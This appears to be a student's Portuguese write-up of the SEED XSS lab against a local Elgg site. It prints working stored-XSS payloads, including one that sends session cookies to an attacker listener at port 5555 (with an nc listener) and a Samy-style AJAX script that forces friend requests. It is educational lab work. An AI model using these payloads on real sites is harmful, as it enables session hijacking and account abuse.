# Cross-Site Scripting (XSS) 

## Setup

Numa fase inicial adicionamos novas entradas nos hosts conhecidos pela máquina virtual e executamos os containers fornecidos no lab:

```bash
sudo nano etc/hosts     # colocar '10.9.0.5 www.seed-server.com'
                        # colocar 'www.example{32a, 32b, 32c, 60, 70}.com'

$ dcbuild               # docker-compose build
$ dcup                  # docker-compose up
```

## Task 1 - Posting a Malicious Message to Display an Alert Window

A tarefa consistia em injetar um código javascript num perfil do *Elgg* de forma a aparecer uma mensagem num popup. Para isso iniciamos sessão com uma conta do sistema, por exemplo a da Alice (alice/seedalice), e editamos o seu perfil. Na parte "About Me", modificamos o HTML dessa secção e colocamos o script:

```html
<script>alert('XSS');</script>
```

Ao observarmos o perfil da Alice com outra conta do sistema, foi possível verificar que o ataque foi bem implementado: tal como esperado, a mensagem no popup apareceu:

![Task 1](../img/lab10task1.png)

## Task 2 - Posting a Malicious Message to Display Cookies

Esta tarefa é muito semelhante à anterior, embora o código seja diferente pois agora permite expor as cookies dos utilizadores assim que visualizam o perfil. Para isso, no campo "About me" da conta da Alice, colocamos o seguinte código:

```html
<script>alert(document.cookie);</script>
```

Agora, sempre que visualizamos o perfil da Alice, os nossos cookies aparecem na mensagem de alerta do próprio website:

![Task 2](../img/lab10task2.png)

## Task 3 - Stealing Cookies from the Victim’s Machine

A ideia do ataque é além de expor as cookies dos utilizadores enviá-las através de um *HTTP request* para o atacante, que estará à escuta na porta 5555 do mesmo servidor. Assim, foi necessário editar o perfil da Alice e na secção "About me" adicionar o seguinte código:

```html
<script>document.write('<img src=http://10.9.0.1:5555?c='
                       + escape(document.cookie) + '   >');
</script>
```

Este código permite que sempre que a página de perfil da Alice é renderizada, os cookies da sessão do cliente seja enviado por *GET requests*. De forma a poder visualizar esses mesmos *requests*, abrimos uma shell e com o seguinte comando ficamos a interceptar as ligações:

```bash
$ nc -lknv 5555
```

Ao iniciar sessão com outra conta e visitar o perfil da Alice, recebemos através da ligação anteriormente feita as cookies desse utilizador do sistema:

![Task 3](../img/lab10task3.png)

## Task 4 - Becoming the Victim’s Friend

A ideia deste ataque é que, quando a vítima entrar no perfil do atacante, adiciona-o como amigo. 

Numa fase inicial, acedeu-se ao perfil do Sammy, fez-se um pedido de amizade e capturou-se o *request* com a ferramenta HTTP Header Live:

![Task 4 a](../img/lab10task4a.png)

Verificou-se que o endereço foi o seguinte:

```note
http://www.seed-server.com/action/friends/add?friend=59&__elgg_ts=1669377267&__elgg_token=Zu2c7dLG2QTOULCeBD8Nsw&__elgg_ts=1669377267&__elgg_token=Zu2c7dLG2QTOULCeBD8Nsw
```

Com base neste URL, construiu-se um script que faz um pedido AJAX sempre que a página de perfil do Sammy é renderizada, e colocou-se no campo "About me" do Sammy. A variável `ts` é o timestamp do pedido e a variável `token` é um token dinâmico que garante a autenticidade do pedido, associada à sessão do utilizador.

```html
<script type="text/javascript">
    window.onload = function () {
    var Ajax=null;
    var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
    var token="&__elgg_token="+elgg.security.token.__elgg_token;
    //Construct the HTTP request to add Samy as a friend.
    var sendurl="http://www.seed-server.com/action/friends/add?friend=59" + ts + token;
    //Create and send Ajax request to add friend
    Ajax=new XMLHttpRequest();
    Ajax.open("GET", sendurl, true);
    Ajax.send();
    }
</script> 
```

Tal como esperado, sempre que outro utilizador do sistema acede ao perfil do Sammy, o browser envia automaticamente um pedido de amizade:

![Task 4 b](../img/lab10task4b.png)

Na imagem pode-se observar que apesar do botão para a amizade não estar clicado, o pedido foi enviado.
